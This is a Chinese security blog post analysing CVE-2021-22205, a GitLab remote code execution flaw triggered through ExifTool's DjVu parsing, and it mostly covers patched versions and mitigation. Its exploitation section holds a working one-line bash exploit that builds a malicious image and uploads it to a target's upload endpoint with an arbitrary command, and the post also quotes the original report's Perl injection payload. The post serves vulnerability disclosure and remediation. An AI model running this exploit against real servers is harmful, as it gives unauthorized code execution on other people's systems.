<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CVE-2021-22205：GitLab远程代码执行漏洞分析 | 闲言语</title><meta name=keywords content><meta name=description content="概况 Remote code execution when uploading specially crafted image files
An issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in a remote command execution. This is a critical severity issue (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, 9.9). It is now mitigated in the latest release and is assigned CVE-2021-22205.
Thanks vakzz for reporting this vulnerability through our HackerOne bug bounty program."><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/211031-cve-2021-22205-mitigation/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="CVE-2021-22205：GitLab远程代码执行漏洞分析"><meta property="og:description" content="概况 Remote code execution when uploading specially crafted image files
An issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in a remote command execution. This is a critical severity issue (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, 9.9). It is now mitigated in the latest release and is assigned CVE-2021-22205.
Thanks vakzz for reporting this vulnerability through our HackerOne bug bounty program."><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/211031-cve-2021-22205-mitigation/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-10-31T20:19:20+08:00"><meta property="article:modified_time" content="2021-10-31T20:19:20+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="CVE-2021-22205：GitLab远程代码执行漏洞分析"><meta name=twitter:description content="概况 Remote code execution when uploading specially crafted image files
An issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in a remote command execution. This is a critical severity issue (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, 9.9). It is now mitigated in the latest release and is assigned CVE-2021-22205.
Thanks vakzz for reporting this vulnerability through our HackerOne bug bounty program."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"CVE-2021-22205：GitLab远程代码执行漏洞分析","item":"https://ret2neo.cn/post/211031-cve-2021-22205-mitigation/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2021-22205：GitLab远程代码执行漏洞分析","name":"CVE-2021-22205：GitLab远程代码执行漏洞分析","description":"概况 Remote code execution when uploading specially crafted image files\nAn issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in a remote command execution. This is a critical severity issue (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, 9.9). It is now mitigated in the latest release and is assigned CVE-2021-22205.\nThanks vakzz for reporting this vulnerability through our HackerOne bug bounty program.","keywords":[],"articleBody":"概况 Remote code execution when uploading specially crafted image files\nAn issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in a remote command execution. This is a critical severity issue (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, 9.9). It is now mitigated in the latest release and is assigned CVE-2021-22205.\nThanks vakzz for reporting this vulnerability through our HackerOne bug bounty program.\nRemediation\nWe strongly recommend that all installations running an affected version above are upgraded to the latest version as soon as possible.\n——https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/#Remote-code-execution-when-uploading-specially-crafted-image-files\n时间线：\n1 2 3 4 2021/3/15 vakzz向hackerone报告漏洞 2021/4/14 GitLab发布更新release 2021/5/14 hackerone公布原始漏洞报告 2021/10/25 HN Security发布在野漏洞利用分析的博文，简化了漏洞利用方式 利用 GitLab在release log中给这个漏洞打分9.9 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)，认为是需要权限的。\n但在对在野利用的事件分析中，HN Security团队发现一种比入侵事件中更简化的无需认证的利用方式。\n所以CVE-2021-22205是一个CVSS 10分的无认证RCE，利用容易，危害高。\n网络上已有利用脚本，我也根据原始报告写了一个bash版本，一行代码就能利用。\n1 t=\"http://vuln.site\";cmd='touch /tmp/cve-2021-22205-proof';f=\"1.jpg\";echo 41542654464f524d000003af444a564d4449524d0000002e81000200000046000000acffffdebf992021c8914eeb0c071fd2da88e86be6440f2c7102ee49d36e95bda2c3223f464f524d0000005e444a5655494e464f0000000a00080008180064001600494e434c0000000f7368617265645f616e6e6f2e696666004247343400000011004a0102000800088ae6e1b137d97f2a89004247343400000004010ff99f4247343400000002020a464f524d00000307444a5649414e546100000150286d657461646174610a0928436f7079726967687420225c0a22202e2071787b|xxd -p -r\u003e$f;echo -n $cmd\u003e\u003e$f;echo 7d202e205c0a222062202229202920202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020|xxd -p -r\u003e\u003e$f;curl -b c -c c -XPOST $t/uploads/user -H \"X-CSRF-Token: $(curl -b c -c c -s \"$t/users/sign_in\" |grep -Po '(?\u003c=csrf-token\" content=\")([^\"]*)')\" -F \"file=@$f\" 注意点：\n并非只有/uploads/user 端点受影响，所有上传图片的点都可能成为攻击的入口，比如在野利用分析报告中用的就是新建一个issue然后访问/user/project/uploads。\n所以，在缓解漏洞时不能仅考虑从路由上禁止。\n原理 GitLab中用来处理上传文件的组件叫gitlab-workhorse，gitlab-workhorse使用开源工具ExifTool来抹除上传的图片中的元数据，ExifTool在解析DjVu格式时存在漏洞，会执行注入的perl脚本。\n存在漏洞的代码（https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233）\n1 2 3 4 # must protect unescaped \"$\" and \"@\" symbols, and \"\\\" at end of string $tok =~ s{\\\\(.)|([\\$\\@]|\\\\$)}{'\\\\'.($2 || $1)}sge; # convert C escape sequences (allowed in quoted text) $tok = eval qq{\"$tok\"}; # here!!! （截图源自在野利用分析文章）\n这里只是overview，有空了仔细分析整个调用流程。\n修复 参考 https://docs.gitlab.com/ee/update/package/index.html#upgrade-to-a-specific-version-using-the-official-repositories 将GitLab升级到安全版本。\n安全版本的GitLab底层使用了安全版本的ExifTool，并且在将文件传给ExiTool处理前，添加了对文件格式的判断。\n为了避免兼容性问题，只需要升级到对应小版本的安全版本即可，并不一定要升级大版本。\n组件 影响版本 安全版本 GitLab(CE/EE) \u003c13.8.8 \u0026 \u003e= 11.9 13.8.8 GitLab(CE/EE) \u003c13.9.6 \u0026 \u003e= 13.9 13.9.6 GitLab(CE/EE) \u003c13.10.3 \u0026 \u003e= 13.10 13.10.3 缓解 简言之\n1 sudo apt install -y libimage-exiftool-perl 具体来说\n这个帖子 讨论了的漏洞根因和应对方案。其中一种是行之有效并且易于操作的，就是升级ExifTool。\nWarkeeper @Warkeeper · 4 months ago @rshambhuni The version of GitLab I installed from source is “13.6.1 (c0876634cc0)” (I cloned it from GitHub’s master branch some day in April), and it’s running on ubuntu 18.04. I reproduced this issue in my setup and found that my setup is also affected by it.\nAfter reading the description of CVE-2021-22205 and this issue, I think it’s mostly the fault of “ExifTool”. Since Ubuntu has released a security version of “ExifTool”, I tried to update ExifTool to 10.80-1ubuntu0.1 in my setup, and after that, I can’t reproduce this issue.\nBut I’m not sure if updating ExifTool is safe enough for this issue, should I update my GitLab as well?\nHeinrich Lee Yu @engwan · 4 months ago Maintainer Yes, upgrading exiftool would prevent the vulnerability. It would still be good to upgrade GitLab though since we added extra checks to prevent other file types from being processed by exiftool.\nThere was also another severity 1 vulnerability that was fixed in the same critical security release.\n——https://gitlab.com/gitlab-org/gitlab/-/issues/327121#note_614878062\n由于漏洞本质上是由ExifTool的CVE-2021-22204引起的，所以升级ExifTool理论上是能够缓解漏洞的。\nImproper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image\nUpstream patch\n——https://bugs.launchpad.net/ubuntu/+source/libimage-exiftool-perl/+bug/1925985\nExifTool在Linux上软件包名叫做 libimage-exiftool-perl，不同发行版上不受CVE-2021-22204影响的安全版本列表如下：\nRelease Version stretch 10.40-1 stretch (security) 10.40-1+deb9u1 buster 11.16-1+deb10u1 bullseye 12.16+dfsg-2 bookworm 12.33+dfsg-1 sid 12.34+dfsg-1 ——https://security-tracker.debian.org/tracker/source-package/libimage-exiftool-perl\n具体操作如下：\n1 2 3 4 5 6 7 8 9 10 11 查看一个软件的可安装版本 apt-cache madison libimage-exiftool-perl 安装某低版本的ExifTool sudo apt install libimage-exiftool-perl=11.88-1 查看已安装ExifTool的版本 exiftool -ver 升级ExifTool版本到最新 sudo apt install -y libimage-exiftool-perl 操作示例：\n实测有效的覆盖更新方法（在Ubuntu18.04上从exiftool 11.7升级到12.34）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 搭建测试环境： # 从 https://packages.gitlab.com/app/gitlab/gitlab-ce/search?q=13.8.0\u0026filter=debs\u0026filter=debs\u0026dist=ubuntu 下载gitlab包 dpkg -i pkgname.deb # 下载 libimage-exiftool-perl_12.34+dfsg-1_all.deb wget http://mirrors.aliyun.com/ubuntu/pool/universe/libi/libimage-exiftool-perl/libimage-exiftool-perl_12.34%2Bdfsg-1_all.deb # 安装 dpkg -i libimage-exiftool-perl_12.34+dfsg-1_all.deb # 备份 tar czf /tmp/exiftool_1170.tgz /opt/gitlab/embedded/lib/exiftool-perl/ /opt/gitlab/embedded/bin/exiftool # 覆盖内嵌exiftool及其依赖 cp /usr/bin/exiftool /opt/gitlab/embedded/bin/exiftool cp -r /usr/share/perl5/Image/ExifTool /opt/gitlab/embedded/lib/exiftool-perl/ cp /usr/share/perl5/File/RandomAccess.pm /opt/gitlab/embedded/lib/exiftool-perl/File/ cp /usr/share/perl5/File/RandomAccess.pod /opt/gitlab/embedded/lib/exiftool-perl/File/ 其他OS，如centos，到 https://pkgs.org/download/libimage-exiftool-perl 页面下载包，参考https://exiftool.org/install.html#Unix 编译后替换gitlab内嵌的exiftool及其依赖。\n原始报告 链接：https://hackerone.com/reports/1154542\n部分节选如下\nSummary When uploading image files, GitLab Workhorse passes any files with the extensions jpg|jpeg|tiff through to ExifTool to remove any non-whitelisted tags.\nAn issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.\nOne of the supported formats is DjVu. When parsing the DjVu annotation, the tokens are evaled to “convert C escape sequences”.\nThere is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated:\nCode\n1 2 3 4 (metadata (Copyright \"\\ \" . qx{echo vakzz \u003e/tmp/vakzz} . \\ \" b \") ) echo_vakzz.jpg.zip is an example DjVu file with the above metadata, and reverse_shell.jpg.zip is an example that runs a reverse shell.\nSteps to reproduce Download echo_vakzz.jpg.zip and unzip it Create a new snippet In the description field, hit “Attach a file” Select and uplaod echo_vakzz.jpg See that the file /tmp/vakzz has been created on the server Uploading reverse_shell.jpg.zip to https://gitlab.com/-/snippets/new resulted in a shell on web-09-sv-gprd\nbonus 使用exiftool的网站都可能受影响，或许是个金矿。测试方法应该是上传再下载，看看元数据是否还被保留。如果被删除了，有一定可能性图片在后端处理时经过了exiftool。\nThere are lots of websites that will display the EXIF data for an image, and also image sharing websites like Flickr and 500px will provide EXIF data for uploaded images by default. Don’t know how many of those use this tool, but I suspect there are lots of bug bounties to be had from this vulnerability.\n——https://old.reddit.com/r/netsec/comments/n36x7h/arbitrary_code_execution_in_exiftool/gwpgk3v/\n参考链接 https://hackerone.com/reports/1154542\nhttps://gitlab.com/gitlab-org/gitlab/-/issues/327121\nhttps://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/\nhttps://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233\nhttps://www.reddit.com/r/netsec/comments/qfbea1/gitlab_ce_cve202122205_in_the_wild/\nhttps://old.reddit.com/r/netsec/comments/n36x7h/arbitrary_code_execution_in_exiftool/gwpgk3v/\nhttps://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/#Remote-code-execution-when-uploading-specially-crafted-image-files\nhttps://bugs.launchpad.net/ubuntu/+source/libimage-exiftool-perl/+bug/1925985\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204\nhttps://security-tracker.debian.org/tracker/source-package/libimage-exiftool-perl\nhttps://docs.gitlab.com/ee/update/package/index.html#upgrade-to-a-specific-version-using-the-official-repositories\nhttps://twitter.com/pdnuclei/status/1453351196350029829\nhttps://github.com/CsEnox/Gitlab-Exiftool-RCE/blob/main/exploit.py\nhttps://github.com/mr-r3bot/Gitlab-CVE-2021-22205\nhttps://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205\n","wordCount":"839","inLanguage":"en","datePublished":"2021-10-31T20:19:20+08:00","dateModified":"2021-10-31T20:19:20+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/211031-cve-2021-22205-mitigation/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>CVE-2021-22205：GitLab远程代码执行漏洞分析</h1><div class=post-meta><span title='2021-10-31 20:19:20 +0800 CST'>October 31, 2021</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/211031-cve-2021-22205-mitigation.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#%e6%a6%82%e5%86%b5 aria-label=概况>概况</a></li><li><a href=#%e5%88%a9%e7%94%a8 aria-label=利用>利用</a></li><li><a href=#%e5%8e%9f%e7%90%86 aria-label=原理>原理</a></li><li><a href=#%e4%bf%ae%e5%a4%8d aria-label=修复>修复</a></li><li><a href=#%e7%bc%93%e8%a7%a3 aria-label=缓解>缓解</a></li><li><a href=#%e5%8e%9f%e5%a7%8b%e6%8a%a5%e5%91%8a aria-label=原始报告>原始报告</a><ul><ul><li><a href=#summary aria-label=Summary>Summary</a></li><li><a href=#steps-to-reproduce aria-label="Steps to reproduce">Steps to reproduce</a></li></ul></ul></li><li><a href=#bonus aria-label=bonus>bonus</a></li><li><a href=#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5 aria-label=参考链接>参考链接</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h1 id=概况>概况<a hidden class=anchor aria-hidden=true href=#概况>#</a></h1><blockquote><p><strong>Remote code execution when uploading specially crafted image files</strong></p><p>An issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in a remote command execution. This is a critical severity issue (<code>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</code>, 9.9). It is now mitigated in the latest release and is assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22205">CVE-2021-22205</a>.</p><p>Thanks <a href=https://hackerone.com/vakzz>vakzz</a> for reporting this vulnerability through our HackerOne bug bounty program.</p><p><strong>Remediation</strong></p><p>We <strong>strongly recommend</strong> that all installations running an affected version above are <strong>upgraded to the latest version as soon as possible</strong>.</p><p>——https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/#Remote-code-execution-when-uploading-specially-crafted-image-files</p></blockquote><p>时间线：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>2021/3/15 vakzz向hackerone报告漏洞
</span></span><span style=display:flex><span>2021/4/14 GitLab发布更新release
</span></span><span style=display:flex><span>2021/5/14 hackerone公布原始漏洞报告
</span></span><span style=display:flex><span>2021/10/25 HN Security发布在野漏洞利用分析的博文，简化了漏洞利用方式
</span></span></code></pre></td></tr></table></div></div><h1 id=利用>利用<a hidden class=anchor aria-hidden=true href=#利用>#</a></h1><p>GitLab在<a href=https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/#Remote-code-execution-when-uploading-specially-crafted-image-files>release log</a>中给这个漏洞打分9.9 (<code>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</code>)，认为是需要权限的。</p><p>但在对在野利用的<a href=https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/>事件分析</a>中，HN Security团队发现一种比入侵事件中更简化的无需认证的利用方式。</p><p>所以<code>CVE-2021-22205</code>是一个CVSS 10分的无认证RCE，利用容易，危害高。</p><p>网络上已有<a href=https://github.com/CsEnox/Gitlab-Exiftool-RCE/blob/main/exploit.py>利用脚本</a>，我也根据原始报告写了一个<a href=https://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205>bash版本</a>，一行代码就能利用。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>t<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://vuln.site&#34;</span>;cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;touch /tmp/cve-2021-22205-proof&#39;</span>;f<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.jpg&#34;</span>;echo 41542654464f524d000003af444a564d4449524d0000002e81000200000046000000acffffdebf992021c8914eeb0c071fd2da88e86be6440f2c7102ee49d36e95bda2c3223f464f524d0000005e444a5655494e464f0000000a00080008180064001600494e434c0000000f7368617265645f616e6e6f2e696666004247343400000011004a0102000800088ae6e1b137d97f2a89004247343400000004010ff99f4247343400000002020a464f524d00000307444a5649414e546100000150286d657461646174610a0928436f7079726967687420225c0a22202e2071787b|xxd -p -r&gt;$f;echo -n $cmd&gt;&gt;$f;echo 7d202e205c0a222062202229202920202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020|xxd -p -r&gt;&gt;$f;curl -b c -c c -XPOST $t/uploads/user -H <span style=color:#e6db74>&#34;X-CSRF-Token: </span><span style=color:#66d9ef>$(</span>curl -b c -c c -s <span style=color:#e6db74>&#34;</span>$t<span style=color:#e6db74>/users/sign_in&#34;</span> |grep -Po <span style=color:#e6db74>&#39;(?&lt;=csrf-token&#34; content=&#34;)([^&#34;]*)&#39;</span><span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> -F <span style=color:#e6db74>&#34;file=@</span>$f<span style=color:#e6db74>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><hr><p>注意点：</p><p>并非只有<code>/uploads/user</code> 端点受影响，所有上传图片的点都可能成为攻击的入口，比如在野利用分析报告中用的就是新建一个issue然后访问<code>/user/project/uploads</code>。</p><p>所以，<strong>在缓解漏洞时不能仅考虑从路由上禁止。</strong></p><h1 id=原理>原理<a hidden class=anchor aria-hidden=true href=#原理>#</a></h1><p>GitLab中用来处理上传文件的组件叫gitlab-workhorse，gitlab-workhorse使用开源工具ExifTool来抹除上传的图片中的元数据，ExifTool在解析DjVu格式时存在漏洞，会执行注入的perl脚本。</p><p>存在漏洞的代码（https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233）</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=display:flex><span><span style=color:#75715e># must protect unescaped &#34;$&#34; and &#34;@&#34; symbols, and &#34;\&#34; at end of string</span>
</span></span><span style=display:flex><span>$tok <span style=color:#f92672>=~</span> <span style=color:#e6db74>s{\\(.)|([\$\@]|\\$)}{&#39;\\&#39;.($2 || $1)}sge</span>;
</span></span><span style=display:flex><span><span style=color:#75715e># convert C escape sequences (allowed in quoted text)</span>
</span></span><span style=display:flex><span>$tok <span style=color:#f92672>=</span> eval <span style=color:#e6db74>qq{&#34;$tok&#34;}</span>;  <span style=color:#75715e># here!!!</span>
